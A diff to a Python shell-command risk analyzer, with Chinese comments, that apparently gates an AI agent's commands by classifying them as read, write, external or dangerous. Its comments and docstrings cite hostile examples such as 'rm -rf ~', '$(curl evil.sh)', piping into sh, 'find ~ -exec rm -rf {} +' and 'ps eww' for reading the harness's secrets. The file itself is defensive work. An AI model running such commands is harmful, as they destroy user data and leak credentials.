@@ -4,7 +4,8 @@
 ``ls && rm -rf ~``、``echo x | sh``、``$(curl evil.sh)``、``python -c "import shutil;..."``、
 ``find . -delete``……所以这里做三件事：
 
-1. **词法切分**：用 ``shlex``（尊重引号）把命令切成 token，再按 ``&& || ; | &`` 拆成若干段；
+1. **词法切分**：先按 bash 的规则把 shlex 不认识的命令边界改写出来（引号外的换行、词首的 ``#`` 注释、续行、
+   here-document 正文，见 ``_bash_lines``），再用 ``shlex``（尊重引号）切成 token，按 ``&& || ; | & |&`` 等拆成若干段；
 2. **逐段分级**：先剥掉包装命令（``env`` / ``timeout`` / ``nice`` / ``xargs`` / ``sudo`` ……只是“换个方式执行
    同一条命令”），再按“真正执行的命令名 + 关键参数”归入 read / write / external / dangerous；
    ``sh -c '...'`` / ``eval`` 的字符串会被 **递归分析**；
@@ -55,7 +56,13 @@ WRAPPERS: dict[str, set[str]] = {
     "nohup": set(), "time": set(), "command": set(), "exec": {"-a"}, "stdbuf": {"-i", "-o", "-e"},
     "timeout": {"-s", "--signal", "-k", "--kill-after"}, "xargs": {"-I", "-n", "-P", "-L", "-d", "-s", "-E", "-a"},
     "sudo": {"-u", "-g", "-C", "-D", "-h", "-p", "-U"}, "doas": {"-u", "-C"}, "caffeinate": {"-t", "-w"},
+    "builtin": set(), "coproc": set(),
 }
+# 复合命令的保留字：``if rm -rf ~; then ...``、``{ rm -rf ~; }`` 里真正执行的是保留字后面的命令
+RESERVED = {"!", "{", "}", "if", "then", "elif", "else", "fi", "while", "until", "do", "done", "esac"}
+# 命令分隔符。shlex 会把相邻的标点并成一个 token（``ls;(rm -rf ~)`` 里的 ``;(``），先按 bash 的运算符拆开再判断
+SEPARATORS = {";", "&&", "||", "|", "&", "|&", ";;", ";&", ";;&", "(", ")"}
+_OPERATOR = re.compile(r";;&|;;|;&|\|\||\|&|&&|&>>|&>|>>|>\||>&|<<<|<<-|<<|<&|<>|[;&|()<>]")
 SAFE_ABS = {"/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/urandom", "/dev/random"}
 _ASSIGN = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*")
 _DURATION = re.compile(r"\d+(\.\d+)?[smhd]?")
@@ -86,6 +93,9 @@ class CommandAnalysis:
     network: bool = False        # 会从网络取回内容（curl、git pull……）：输出不可信，标记污点
     # 含命令替换 / 进程替换：替换里执行的命令藏在另一条命令的参数中，allow 规则按前缀匹配时看不见它
     opaque: bool = False
+    # 命令里嵌着另一段要执行的代码（sh -c、eval、find -exec、解释器内联代码……）：前几个词说明不了实际执行什么，
+    # “本会话总是允许”只能精确授权这一条，不能按前缀放行
+    inline: bool = False
     workspace: str | None = field(default=None, repr=False)
     depth: int = field(default=0, repr=False)   # sh -c / eval 的递归深度
 
@@ -142,16 +152,17 @@ def analyze(command: str, workspace: str | None = None, *, _depth: int = 0) -> C
         a.bump("dangerous", "下载后直接执行（curl | sh）")
 
     try:
-        lex = shlex.shlex(command, posix=True, punctuation_chars=";&|<>()")
+        lex = shlex.shlex(_bash_lines(command), posix=True, punctuation_chars=";&|<>()")
         lex.whitespace_split = True
+        lex.commenters = ""  # shlex 把词中间的 # 也当注释（echo a#b; rm -rf ~ 的后半句会被吞掉）；注释已由 _bash_lines 按 bash 规则去掉
         tokens = list(lex)
     except ValueError as e:  # 引号不配对等
         a.bump("external", f"命令无法解析：{e}")
         return a
 
     segment: list[str] = []
-    for tok in tokens + [";"]:
-        if tok in (";", "&&", "||", "|", "&", ";;", "(", ")"):
+    for tok in _split_operators(tokens) + [";"]:
+        if tok in SEPARATORS:
             if segment:
                 a.segments.append(" ".join(segment))
                 _classify(segment, a)
@@ -159,18 +170,187 @@ def analyze(command: str, workspace: str | None = None, *, _depth: int = 0) -> C
             if tok == "&":
                 a.bump("write", "后台执行（&）")
             continue
-        if tok in (">", ">>", "<", ">|", "&>", ">&"):
-            segment.append(tok)
-            continue
         segment.append(tok)
     return a
 
 
+def _split_operators(tokens: list[str]) -> list[str]:
+    """shlex 把连续的标点并成一个 token：``;(``、``&&(``、``)>``。按 bash 的运算符重新拆开，分隔符才认得出来。"""
+    out: list[str] = []
+    for tok in tokens:
+        if tok and not tok.strip(";&|<>()"):
+            out.extend(_OPERATOR.findall(tok))
+        else:
+            out.append(tok)
+    return out
+
+
+def _bash_lines(cmd: str) -> str:
+    """把 bash 认作命令边界、shlex 却看不出来的结构改写成 shlex 认得的样子。
+
+    shlex 把换行当普通空白，bash 却把引号外的换行当命令分隔符：``echo safe⏎touch x`` 在分析器眼里是一条只读 echo，
+    执行时却是两条命令。这里按 bash 的规则扫一遍（引号、``$( )``、反引号、``$(( ))`` 分别跟踪上下文）：
+
+    - 引号外的换行 → `` ; ``；``\\``+换行是续行，直接去掉；
+    - 词首的 ``#`` 到行尾是注释，去掉（``a#b`` 里的 # 不是注释）；
+    - here-document 的正文是喂给命令的数据，不是命令，去掉。找不到结束符时不去掉，正文按命令分析——
+      宁可多问，也不能把真正会执行的行当成数据。正文里的凭证路径、``$( )`` 仍由 analyze() 对原始命令串的检查覆盖。
+
+    引号不配对时原样交给 shlex，由它报“无法解析”。
+    """
+    if "\n" not in cmd and "#" not in cmd:
+        return cmd
+    out: list[str] = []
+    stack: list[str] = []                      # 上下文：引号 "'"、'"'、"$'"；命令 "`"、"$("、"("；算术 "(("、"a("
+    heredocs: list[tuple[str, bool]] = []      # 本行登记的 here-document：(结束符, 是否 <<-)
+    i, n = 0, len(cmd)
+    while i < n:
+        c, top = cmd[i], (stack[-1] if stack else "")
+        if top == "'":
+            if c == "'":
+                stack.pop()
+            out.append(c)
+            i += 1
+            continue
+        if top in ('"', "$'", "`") and c == "\\" and i + 1 < n:
+            out.append(cmd[i:i + 2])          # 转义的引号不结束字符串
+            i += 2
+            continue
+        if top == "$'":
+            if c == "'":
+                stack.pop()
+            out.append(c)
+            i += 1
+            continue
+        if top == '"':
+            if c == '"':
+                stack.pop()
+            elif cmd.startswith("$(", i):         # 双引号里的 $( ) 重新开始命令上下文（引号也重新配对）
+                k = 3 if cmd.startswith("$((", i) else 2
+                stack.append("((" if k == 3 else "$(")
+                out.append(cmd[i:i + k])
+                i += k
+                continue
+            elif c == "`":
+                stack.append("`")
+            out.append(c)
+            i += 1
+            continue
+        # ---- 命令上下文：顶层、$( )、( )、反引号、$(( ))
+        if top in ("((", "a("):                 # 算术：<< 是移位、# 不是注释，只跟踪括号；换行照样拆开，不让两行粘成一条
+            if top == "((" and cmd.startswith("))", i):
+                stack.pop()
+                out.append("))")
+                i += 2
+                continue
+            if c == "(":
+                stack.append("a(")
+            elif c == ")" and top == "a(":
+                stack.pop()
+            out.append(" ; " if c == "\n" else c)
+            i += 1
+            continue
+        if c == "\\" and i + 1 < n:
+            if cmd[i + 1] != "\n":                # 续行：反斜杠和换行一起去掉
+                out.append(cmd[i:i + 2])
+            i += 2
+            continue
+        if c == "`" and top == "`":
+            stack.pop()
+        elif c in "'\"`":
+            stack.append(c)
+        elif cmd.startswith("$'", i):
+            stack.append("$'")
+            out.append("$'")
+            i += 2
+            continue
+        elif cmd.startswith(("$((", "(("), i):
+            stack.append("((")
+            k = 3 if c == "$" else 2
+            out.append(cmd[i:i + k])
+            i += k
+            continue
+        elif cmd.startswith("$(", i):
+            stack.append("$(")
+            out.append("$(")
+            i += 2
+            continue
+        elif c == "(":
+            stack.append("(")
+        elif c == ")" and top in ("$(", "("):
+            stack.pop()
+        elif c == "#" and (i == 0 or cmd[i - 1] in " \t\n;&|()<>"):
+            while i < n and cmd[i] != "\n":   # 注释：去到行尾，换行留给下面当分隔符
+                i += 1
+            continue
+        elif cmd.startswith("<<", i) and not cmd.startswith("<<<", i):
+            j, strip_tabs = i + 2, cmd.startswith("<<-", i)
+            j += strip_tabs
+            while j < n and cmd[j] in " \t":
+                j += 1
+            delim, j = _heredoc_word(cmd, j)
+            if delim:
+                heredocs.append((delim, strip_tabs))
+            out.append(cmd[i:j])
+            i = j
+            continue
+        elif c == "\n":
+            out.append(" ; ")
+            i += 1
+            for delim, strip_tabs in heredocs:
+                end = _heredoc_end(cmd, i, delim, strip_tabs)
+                if end is None:                   # 没有结束符：正文按命令分析
+                    break
+                i = end
+            heredocs.clear()
+            continue
+        out.append(c)
+        i += 1
+    return "".join(out)
+
+
+def _heredoc_word(cmd: str, j: int) -> tuple[str, int]:
+    """读出 ``<<`` 后面的结束符（去掉引号与反斜杠，bash 按去引号后的字面量比较），返回 (结束符, 读到的位置)。"""
+    word, quote = [], ""
+    while j < len(cmd):
+        c = cmd[j]
+        if quote:
+            if c == quote:
+                quote = ""
+            else:
+                word.append(c)
+        elif c in "'\"":
+            quote = c
+        elif c == "\\" and j + 1 < len(cmd):
+            j += 1
+            word.append(cmd[j])
+        elif c in " \t\n;&|()<>":
+            break
+        else:
+            word.append(c)
+        j += 1
+    return "".join(word), j
+
+
+def _heredoc_end(cmd: str, start: int, delim: str, strip_tabs: bool) -> int | None:
+    """从 start 起逐行找结束符所在的行，返回它之后的位置；找不到返回 None。"""
+    pos = start
+    while pos <= len(cmd):
+        nl = cmd.find("\n", pos)
+        line = cmd[pos:] if nl == -1 else cmd[pos:nl]
+        if (line.lstrip("\t") if strip_tabs else line) == delim:
+            return len(cmd) if nl == -1 else nl + 1
+        if nl == -1:
+            return None
+        pos = nl + 1
+    return None
+
+
 def _unwrap(words: list[str], a: CommandAnalysis) -> list[str]:
-    """剥掉前置赋值与包装命令，返回真正执行的那条命令（可能为空：例如单独的 ``env``）。"""
+    """剥掉前置赋值、复合命令的保留字与包装命令，返回真正执行的那条命令（可能为空：例如单独的 ``env``、``fi``）。"""
     while words:
-        while words and _ASSIGN.fullmatch(words[0]):
-            words = words[1:]  # FOO=bar cmd ...
+        while words and (_ASSIGN.fullmatch(words[0]) or words[0] in RESERVED or words[0] == "function"):
+            words = words[2:] if words[0] == "function" else words[1:]  # FOO=bar cmd、then cmd、function f { cmd
         if not words:
             return []
         name = words[0].rsplit("/", 1)[-1]
@@ -183,6 +363,7 @@ def _unwrap(words: list[str], a: CommandAnalysis) -> list[str]:
             opt = rest.pop(0)
             if name == "env" and opt in ("-S", "--split-string") or opt.startswith("--split-string="):
                 a.bump("external", "env -S 会把字符串再切分执行，无法静态分析")
+                a.inline = True
             if opt in takes and rest:
                 rest.pop(0)
         if name == "command" and rest[:1] in (["-v"], ["-V"]) or words[1:2] in (["-v"], ["-V"]) and name == "command":
@@ -318,8 +499,7 @@ def _classify(seg: list[str], a: CommandAnalysis) -> None:
                    else f"访问工作区外路径 {val}")
             break
 
-    if cmd in SHELLS and "-c" in args:
-        script = args[args.index("-c") + 1] if args.index("-c") + 1 < len(args) else ""
+    if cmd in SHELLS and (script := _shell_script(args)) is not None:
         _recurse(script, a, f"{cmd} -c")
     elif cmd == "eval":
         _recurse(" ".join(args), a, "eval")
@@ -334,13 +514,14 @@ def _classify(seg: list[str], a: CommandAnalysis) -> None:
         a.flag_catastrophic(f"格式化文件系统 {cmd}")
     elif cmd in ("env", "printenv") and not args:
         a.bump("external", "输出全部环境变量（可能包含密钥）")
+    elif cmd == "ps" and _ps_shows_env(args):
+        # 子进程的环境已经剥掉了密钥，ps 看的却是别的进程——包括 harness 自己（ps eww -p $PPID）。与 /proc/*/environ 同档
+        a.flag_credential("ps 带 e/E 选项会打印进程的环境变量（等同读取 /proc/<pid>/environ），包括 harness 自身的密钥")
     elif cmd == "rm":
         flags = "".join(x for x in args if x.startswith("-"))
         targets = [x for x in args if not x.startswith("-")]
         recursive = "r" in flags or "R" in flags
-        # 根目录、家目录，以及它们下面的一级目录（/usr、/etc、~/projects、$HOME/Documents……）
-        roots = [t for t in targets if t.rstrip("/") in ("", "/*", *_HOME, "~/*", "$HOME/*")
-                 or re.fullmatch(r"/[^/]+/?", t) or re.fullmatch(r"(~|\$HOME|\$\{HOME\})/[^/]+/?", t)]
+        roots = [t for t in targets if _is_root_like(t)]
         if recursive and roots:
             a.flag_catastrophic(f"递归删除 {roots[0]}")
         elif recursive and any(t.rstrip("/") in ("*", "..", ".", "") or _is_outside(t, a) for t in targets):
@@ -355,6 +536,7 @@ def _classify(seg: list[str], a: CommandAnalysis) -> None:
     elif cmd == "find":
         if any(x in ("-delete", "-exec", "-execdir", "-ok", "-okdir") for x in args):
             a.bump("write", "find 带 -delete/-exec")
+            _find_actions(args, a)
         elif any(x in ("-fprint", "-fprint0", "-fprintf", "-fls") for x in args):
             a.bump("write", "find 把结果写入文件")
         else:
@@ -375,8 +557,9 @@ def _classify(seg: list[str], a: CommandAnalysis) -> None:
             a.bump("read", f"{cmd} 流式处理")
     elif cmd == "sort" and any(x == "-o" or x.startswith(("-o", "--output")) for x in args):
         a.bump("write", "sort -o 写入文件")
-    elif cmd in INTERPRETERS and any(x in ("-c", "-e", "--eval") for x in args):
-        a.bump("external", f"{cmd} 内联代码无法静态分析")
+    elif cmd in INTERPRETERS and any(x in ("-c", "-e", "--eval") or re.fullmatch(r"-[A-Za-z]*[ce]", x) for x in args):
+        a.bump("external", f"{cmd} 内联代码无法静态分析")   # 含合写的短选项：python3 -Ic、perl -ne、node -pe
+        a.inline = True
     elif cmd in SHELLS and not [x for x in args if not x.startswith("-")]:
         a.bump("external", f"{cmd} 从标准输入执行脚本，内容无法静态分析")
     elif cmd in ("python", "python3") and args[:1] in (["--version"], ["-V"]):
@@ -395,8 +578,86 @@ def _classify(seg: list[str], a: CommandAnalysis) -> None:
         a.bump("write", f"未知命令 {cmd}，按可写处理")
 
 
+def _is_root_like(t: str) -> bool:
+    """根目录、家目录，以及它们下面的一级目录（/usr、/etc、~/projects、$HOME/Documents……）：整棵删掉就是灾难。"""
+    return (t.rstrip("/") in ("", "/*", *_HOME, "~/*", "$HOME/*")
+            or bool(re.fullmatch(r"/[^/]+/?", t) or re.fullmatch(r"(~|\$HOME|\$\{HOME\})/[^/]+/?", t)))
+
+
+def _shell_script(args: list[str]) -> str | None:
+    """``bash -c`` 的脚本。``-c`` 可以和别的短选项合写（``-lc``、``-ec``、``-xc``），脚本是选项之后的第一个非选项参数；
+    ``-o``/``-O`` 与 ``--rcfile`` 这类选项带一个值。没有 ``-c`` 时返回 None。"""
+    has_c, i = False, 0
+    while i < len(args):
+        x = args[i]
+        if x == "--":
+            i += 1
+            break
+        if x in ("--rcfile", "--init-file"):
+            i += 2
+        elif x.startswith("--"):
+            i += 1
+        elif len(x) > 1 and x[0] in "-+":
+            has_c = has_c or (x[0] == "-" and "c" in x[1:])
+            i += 2 if x[-1] in "oO" else 1
+        else:
+            break
+    if not has_c:
+        return None
+    return args[i] if i < len(args) else ""
+
+
+def _find_actions(args: list[str], a: CommandAnalysis) -> None:
+    """``find`` 的删除与执行动作。起点路径会被自己的动作处理到（``find ~ -delete`` 删的就是整个家目录），
+    所以 ``-exec`` 的命令把 ``{}`` 换成起点路径再递归分析：``find ~ -exec rm -rf {} +`` 等同 ``rm -rf ~``。"""
+    i = 0
+    while i < len(args) and (args[i] in ("-H", "-L", "-P", "-E", "-X", "-d", "-s", "-x") or args[i].startswith("-O")
+                             or args[i] in ("-D", "-f")):
+        i += 2 if args[i] in ("-D", "-f") else 1
+    roots: list[str] = []
+    while i < len(args) and not args[i].startswith(("-", "(", "!", ")")):
+        roots.append(args[i])
+        i += 1
+    roots = roots or ["."]
+    if "-delete" in args:
+        hit = next((r for r in roots if _is_root_like(r)), None)
+        if hit:
+            a.flag_catastrophic(f"find {hit} -delete 删除整棵目录树")
+    for j, x in enumerate(args):
+        if x not in ("-exec", "-execdir", "-ok", "-okdir"):
+            continue
+        end = next((k for k in range(j + 1, len(args)) if args[k] in (";", "+")), len(args))
+        action = args[j + 1:end]
+        if not action:
+            continue
+        for root in roots[:4]:
+            _recurse(shlex.join(root if w == "{}" else w for w in action), a, f"find {x}")
+
+
+def _ps_shows_env(args: list[str]) -> bool:
+    """ps 是否会打印进程环境：``-E``（macOS）或 BSD 风格的 ``e``（``ps eww``、``ps axe``，macOS 与 Linux 都是）。
+    ``ps -e`` / ``ps -ef`` 是“所有进程”，不打印环境。带值的选项（``-p 1``、``-o pid``、``U deploy``）跳过它的值。"""
+    takes_value = set("GgMNOopqtUuCs")
+    skip = False
+    for x in args:
+        if skip:
+            skip = False
+            continue
+        if x.startswith("--"):
+            continue
+        dash = x.startswith("-")
+        letters = x[1:] if dash else x
+        if not re.fullmatch(r"[A-Za-z]+", letters):
+            continue
+        if ("E" in letters) if dash else ("e" in letters.lower()):
+            return True
+        skip = letters[-1] in takes_value
+    return False
+
+
 def _recurse(script: str, a: CommandAnalysis, via: str) -> None:
     """``sh -c`` / ``eval`` 的字符串本身就是一条命令：递归分析（限制深度，防止构造的深层嵌套拖慢判定）。"""
+    a.inline = True
     if a.depth >= 3 or not script.strip():
         a.bump("external", f"{via} 嵌套过深或内容为空，无法静态分析")
         return
